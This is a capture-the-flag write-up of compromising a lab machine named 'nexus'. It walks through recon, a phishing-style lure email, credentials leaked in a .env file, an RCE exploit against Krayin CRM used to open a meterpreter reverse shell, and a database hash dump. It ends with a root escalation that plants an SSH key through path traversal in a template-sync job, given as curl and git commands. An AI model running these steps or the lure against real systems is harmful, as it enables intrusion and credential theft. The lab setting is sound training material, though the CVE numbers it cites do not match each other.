                                                                                                                              ΓöÇΓöÇ(Fri,Jun26)ΓöÇΓöÿ
ok nexus now , lets go with nmap as always :

```
nmap nexus.htb
:
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

```

as expected , lets go http now , its a website related to energy ,(lets fuzz in bg) ,in the application i found out there is a job portol so i sent them a mail just to check if anyone will respond :

```
If you want a slightly more "natural" version that doesn't scream phishing as much:
Subject: Application Follow-up ΓÇô Portfolio link: http://10.10.14.59/
Keep in mind most mail clients render the subject as plain text, so the link won't be clickable there ΓÇö it just helps if the recipient skims subjects only. The actual clickable part still needs to be in the email body.

AND :

Hi,

I'd like to apply for the Operations Specialist ΓÇô Customer Platforms role.

Please find my CV and portfolio here: http://10.10.14.59/cv.pdf

Happy to discuss further at your convenience.

Best regards,
sawsage

```

and host a http.server to capture , but it did not seem to work , and on the other side i found out 2 subdomains :

```
git                     [Status: 200, Size: 14472, Words: 1195, Lines: 242, Duration: 287ms]
billing                 [Status: 302, Size: 390, Words: 60, Lines: 12, Duration: 336ms]
```


lets add them to host and view them , gits running Gitea Version: 1.26.0 which has :

```
CVE-2026-28737 (Stored XSS): Found in the 3D File Viewer via glTF extensions.
CVE-2026-22555 (Information Disclosure): Allowed exfiltration of organization secrets due to a missing check in the API fork flow.
CVE-2026-27780 (Auth Bypass): Allowed branch protection bypass via silent truncation in the pre-receive hook processing.
```

and after fuzzing the directories i found out got :

```
v2                      [Status: 401, Size: 49, Words: 1, Lines: 1, Duration: 733ms]
Admin                   [Status: 200, Size: 22805, Words: 1961, Lines: 425, Duration: 5700ms]
jones                   [Status: 200, Size: 20221, Words: 1703, Lines: 382, Duration: 1594ms]
                        [`Status: 200, Size: 14472, Words: 1195, Lines: 242, Duration: 1013ms
```

and when i visited john i found out this repo :

IMG HERE

and in the .env : (in the commit history)

```
APP_NAME='Krayin CRM'
APP_ENV=local
APP_KEY=
APP_DEBUG=true
APP_URL=http://nexus.htb
APP_TIMEZONE=Asia/Kolkata
APP_LOCALE=en
APP_CURRENCY=USD
VITE_HOST=
VITE_PORT=
LOG_CHANNEL=stack
LOG_LEVEL=debug
DB_CONNECTION=mysql
DB_HOST=krayin-mysql
DB_PORT=3306
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=N27xh!!2ucY04
DB_PREFIX=
BROADCAST_DRIVER=log
CACHE_DRIVER=file
QUEUE_CONNECTION=sync
SESSION_DRIVER=file
SESSION_LIFETIME=120
MEMCACHED_HOST=127.0.0.1
REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379
MAIL_MAILER=smtp
MAIL_HOST=mailhog
MAIL_PORT=1025
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null
MAIL_FROM_ADDRESS=laravel@krayincrm.com
MAIL_FROM_NAME="${APP_NAME}"
MAIL_DOMAIN=webkul.com
MAIL_RECEIVER_DRIVER=sendgrid
IMAP_HOST=imap.nexus.htb
IMAP_PORT=993
IMAP_ENCRYPTION=ssl
IMAP_VALIDATE_CERT=true
IMAP_USERNAME=username1
IMAP_PASSWORD=password1
AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
AWS_DEFAULT_REGION=us-east-1
AWS_BUCKET=
PUSHER_APP_ID=
PUSHER_APP_KEY=
PUSHER_APP_SECRET=
PUSHER_APP_CLUSTER=mt1
MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"

```

and the yml has :

```
version: '3.1'

services:
  krayin-app:
    image: webkul/krayin:latest
    ports:
      - "80:80"
    depends_on:
      - krayin-mysql
    volumes:
      - ./storage:/var/www/html/storage
    environment:
      APP_NAME: "Krayin CRM"
      APP_ENV: local
      APP_DEBUG: "true"
      APP_URL: http://test.htbs
      APP_TIMEZONE: Asia/Kolkata
      APP_LOCALE: en
      APP_CURRENCY: USD
      DB_CONNECTION: mysql
      DB_HOST: krayin-mysql
      DB_PORT: 3306
      DB_DATABASE: krayin
      DB_USERNAME: krayin
      DB_PASSWORD: ${DB_PASSWORD}
    restart: unless-stopped

  krayin-mysql:
    image: mysql:8.0
    command: --default-authentication-plugin=mysql_native_password
    environment:
      MYSQL_DATABASE: krayin
      MYSQL_USER: krayin
      MYSQL_PASSWORD: ${DB_PASSWORD}
      MYSQL_ROOT_PASSWORD: ${DB_ROOT_PASSWORD}
    volumes:
      - dbvolume:/var/lib/mysql
    restart: unless-stopped

  krayin-phpmyadmin:
    image: phpmyadmin:latest
    ports:
      - "8080:80"
    environment:
      PMA_HOST: krayin-mysql
      PMA_USER: krayin
      PMA_PASSWORD: ${DB_PASSWORD}
    restart: unless-stopped

volumes:
  dbvolume:
```

found creds :

```
DB_USERNAME=krayin
DB_PASSWORD=N27xh!!2ucY04
```

now lets see the billing : it gives us a login page powered by Krayin CRM , lets try the creds found early , it just accepts an email i tried krayin@nexus.htb and many none worked , then i remembered i found a mail account of manager earlyer in the initial recon stage `j.matthew@nexus.htb` i was not expecting this to work but well it did and we did login and we see dashbord now :

SC HERE

now finally we i have the version of krayin as well `2.2.0` and i remember it has a CVE-2026-38528 which gives rce and now i finally smell foothold , found https://github.com/NathanHimself/CVE-2026-38526-PoC.git and it works like a charm ,

```
python3 exploit.py -t <target URL> -u <email> -p <password> -c <command>
```

i used linux/x64/meterpreter/reverse_tcp payload to get a reverse shell in msfconsole , now lets see waht we have here,

got the DB_creds to the the user krayin (y27xb3ha!!74GbR) with the help of linpeas.sh , then i accessed the mysql running locally which was holding the creds of the user :

```

MySQL [krayin]>	select * from users;
+----+-------+---------------------+--------------------------------------------------------------+--------+-----------------+---------+----------------+---------------------+---------------------+-------+
| id | name  | email               | password                                                     | status | view_permission | role_id | remember_token | created_at          | updated_at          | image |
+----+-------+---------------------+--------------------------------------------------------------+--------+-----------------+---------+----------------+---------------------+---------------------+-------+
|  1 | james | j.matthew@nexus.htb | $2y$10$ez0AouNyeP4NmwjLSV5vCOAJxMLi.6fCKmGC3M6Ve5xJmWJOLRJ5i |      1 | global          |       1 | NULL           | 2026-04-23 04:20:11 | 2026-04-23 04:20:11 | NULL  |
+----+-------+---------------------+--------------------------------------------------------------+--------+-----------------+---------+----------------+---------------------+---------------------+-------+

```


now lets try cracking it , .......(taking its sweet time) , its uncracable taht intresting ... there are 2 users in this machine 1 is jones and git , so i tried the password 'y27xb3ha!!74GbR'  just in case and idk how but it worked for the user jones and then we get the user.txt

now lets do the priv esc , there is a schedule task which runs every 1 min i checked it and found the way to do the priv esc :

```
gitea-template-sync.timer fires every ~1 minute
        Γåô
runs template-sync.py as ROOT
        Γåô
script calls git ls-tree on your RCE repo (marked as Template)
        Γåô
sees path: ../../../../root/.ssh/authorized_keys
        Γåô
os.path.join() resolves it outside the base directory
        Γåô
writes your public key to /root/.ssh/authorized_keys
        Γåô
ssh -i /tmp/.k root@nexus.htb  Γ£ô
```


so i created a script which does this much faster : (https://github.com/Aditya-k-Jangid/Scripts/blob/main/nexus_priv-esc.py)


if u prefer manual steps :

```
## Manual Steps

**1. Add hosts entry**
```bash
echo "10.129.110.154 nexus.htb git.nexus.htb" >> /etc/hosts
```

**2. Generate SSH key**
```bash
ssh-keygen -t ed25519 -f /tmp/.k -N ''
```

**3. Create template repo on Gitea**
```bash
curl -s -X POST "http://git.nexus.htb/api/v1/user/repos" \
    -u "jones:y27xb3ha!!74GbR" \
    -H "Content-Type: application/json" \
    -d '{"name":"RCE","template":true,"auto_init":false}'
```

**4. Clone & build malicious tree**
```bash
git clone http://jones:y27xb3ha!!74GbR@git.nexus.htb/jones/RCE.git /tmp/rce
cd /tmp/rce
python3 /tmp/build.py
```

**5. Push**
```bash
git push http://jones:y27xb3ha!!74GbR@git.nexus.htb/jones/RCE.git main --force
```

**6. Wait ~1 min, then check if key landed**
```bash
cat /var/log/template-sync.log
```

**7. SSH as root**
```bash
ssh -i /tmp/.k -o StrictHostKeyChecking=no root@nexus.htb
```
```
